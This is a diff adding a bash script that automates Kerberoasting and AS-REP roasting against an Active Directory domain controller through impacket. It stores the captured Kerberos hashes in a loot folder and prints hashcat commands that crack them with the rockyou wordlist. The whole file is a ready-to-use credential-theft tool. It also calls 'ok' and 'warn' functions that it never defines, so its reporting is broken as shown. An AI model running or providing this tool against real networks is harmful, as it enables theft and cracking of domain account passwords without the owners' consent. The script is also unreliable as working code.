@@ -1,0 +1,149 @@
+#!/bin/bash
+set -euo pipefail
+# /usr/local/bin/kerberoast
+# Kerberoasting + AS-REP Roasting via impacket
+# Ported from Raspyjack kerberoast.py (7h30th3r0n3) for ZERO-DAY OS arm64
+#
+# Modes:
+#   kerberoast  — request TGS for SPN accounts, extract crackable hashes
+#   asrep       — AS-REP roast accounts with no pre-auth required
+#   auto        — try both against discovered DC
+#
+# Hashes saved in hashcat format (mode 13100 for Kerberoast, 18200 for AS-REP)
+#
+# Usage: kerberoast <mode> <dc_ip> <domain> [user] [password|:NTHASH]
+#
+# Deps: impacket — apt install python3-impacket  OR  pip3 install impacket
+
+MODE="${1:-help}"
+DC="${2:-}"
+DOMAIN="${3:-}"
+USER="${4:-}"
+PASS="${5:-}"
+LOOT="/opt/cardputer/loot/creds"
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+mkdir -p "$LOOT"
+
+RED='\033[0;31m'; CYAN='\033[0;36m'; GREEN='\033[0;32m'
+YELLOW='\033[1;33m'; BOLD='\033[1m'; NC='\033[0m'
+
+check_impacket() {
+    python3 -c "from impacket.examples.GetUserSPNs import main" 2>/dev/null && return 0
+    # Try impacket CLI scripts directly
+    command -v GetUserSPNs.py &>/dev/null && return 0
+    command -v GetNPUsers.py  &>/dev/null && return 0
+    echo -e "${RED}[!] impacket not found.${NC}"
+    echo -e "${CYAN}[*]${NC} Install: apt install python3-impacket"
+    echo -e "${CYAN}[*]${NC}      OR: pip3 install impacket"
+    return 1
+}
+
+run_getuserspns() {
+    local dc="$1" domain="$2" user="$3" pass="$4" outfile="$5"
+    local cred="${domain}/${user}:${pass}"
+    local cmd=""
+
+    if command -v GetUserSPNs.py &>/dev/null; then
+        cmd="GetUserSPNs.py"
+    else
+        cmd="python3 -m impacket.examples.GetUserSPNs"
+    fi
+
+    echo -e "${CYAN}[*]${NC} Requesting TGS for SPN accounts..."
+    $cmd "$cred" -dc-ip "$dc" -request -outputfile "$outfile" 2>&1 \
+        | grep -v "^Impacket\|^ServicePrincipalName" | head -30
+}
+
+run_getnpusers() {
+    local dc="$1" domain="$2" user="$3" pass="$4" outfile="$5"
+    local cmd=""
+
+    if command -v GetNPUsers.py &>/dev/null; then
+        cmd="GetNPUsers.py"
+    else
+        cmd="python3 -m impacket.examples.GetNPUsers"
+    fi
+
+    echo -e "${CYAN}[*]${NC} Requesting AS-REP for accounts without pre-auth..."
+    $cmd "${domain}/" -dc-ip "$dc" -usersfile /usr/share/wordlists/usernames.txt \
+        -format hashcat -outputfile "$outfile" 2>&1 | head -30
+
+    # Also try with valid creds if provided
+    if [ -n "$user" ] && [ -n "$pass" ]; then
+        $cmd "${domain}/${user}:${pass}" -dc-ip "$dc" -request \
+            -format hashcat -outputfile "${outfile}.cred" 2>&1 | head -20
+    fi
+}
+
+case "$MODE" in
+help|--help|-h)
+    echo "Usage: kerberoast <mode> <dc_ip> <domain> [user] [pass_or_:NTHASH]"
+    echo ""
+    echo "Modes:"
+    echo "  kerberoast  — Request TGS hashes for SPN accounts (hashcat mode 13100)"
+    echo "  asrep       — AS-REP roast accounts without pre-auth (hashcat mode 18200)"
+    echo "  auto        — Try both"
+    echo ""
+    echo "Examples:"
+    echo "  kerberoast kerberoast 192.168.1.10 corp.local jdoe Password123"
+    echo "  kerberoast asrep 192.168.1.10 corp.local"
+    echo "  kerberoast auto 192.168.1.10 corp.local jdoe ':aabbccddeeff0011'"
+    echo ""
+    echo "Crack hashes:"
+    echo "  hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt"
+    echo "  hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt"
+    exit 0
+    ;;
+esac
+
+[ -z "$DC" ]     && { echo -e "${RED}[!] DC IP required${NC}"; exit 1; }
+[ -z "$DOMAIN" ] && { echo -e "${RED}[!] Domain required${NC}"; exit 1; }
+check_impacket   || exit 1
+
+echo -e "${BOLD}${CYAN}━━━ KERBEROAST — ZERO-DAY OS ━━━${NC}"
+echo -e "${CYAN}[*]${NC} DC:     $DC"
+echo -e "${CYAN}[*]${NC} Domain: $DOMAIN"
+[ -n "$USER" ] && echo -e "${CYAN}[*]${NC} User:   $USER"
+echo ""
+
+case "$MODE" in
+kerberoast|tgs)
+    OUTFILE="$LOOT/kerberoast_${TIMESTAMP}.txt"
+    run_getuserspns "$DC" "$DOMAIN" "$USER" "$PASS" "$OUTFILE"
+    if [ -s "$OUTFILE" ]; then
+        ok "Hashes saved: $OUTFILE ($(wc -l < "$OUTFILE") hashes)"
+        ok "Crack with: hashcat -m 13100 $OUTFILE /usr/share/wordlists/rockyou.txt"
+    else
+        warn "No hashes obtained. Check credentials or SPN accounts."
+    fi
+    ;;
+
+asrep|as-rep|asrep-roast)
+    OUTFILE="$LOOT/asrep_${TIMESTAMP}.txt"
+    run_getnpusers "$DC" "$DOMAIN" "$USER" "$PASS" "$OUTFILE"
+    if [ -s "$OUTFILE" ]; then
+        ok "Hashes saved: $OUTFILE"
+        ok "Crack with: hashcat -m 18200 $OUTFILE /usr/share/wordlists/rockyou.txt"
+    else
+        warn "No AS-REP hashes. Try with a userlist or valid account."
+    fi
+    ;;
+
+auto)
+    KTFILE="$LOOT/kerberoast_${TIMESTAMP}.txt"
+    ARFILE="$LOOT/asrep_${TIMESTAMP}.txt"
+    run_getuserspns "$DC" "$DOMAIN" "$USER" "$PASS" "$KTFILE"
+    run_getnpusers  "$DC" "$DOMAIN" "$USER" "$PASS" "$ARFILE"
+    [ -s "$KTFILE" ] && ok "Kerberoast hashes: $KTFILE"
+    [ -s "$ARFILE" ] && ok "AS-REP hashes: $ARFILE"
+    if [ -s "$KTFILE" ] || [ -s "$ARFILE" ]; then
+        echo ""
+        ok "Crack:"
+        [ -s "$KTFILE" ] && echo "  hashcat -m 13100 $KTFILE /usr/share/wordlists/rockyou.txt"
+        [ -s "$ARFILE" ] && echo "  hashcat -m 18200 $ARFILE /usr/share/wordlists/rockyou.txt"
+    fi
+    ;;
+
+*)
+    echo -e "${RED}[!] Unknown mode: $MODE${NC}"; exit 1 ;;
+esac
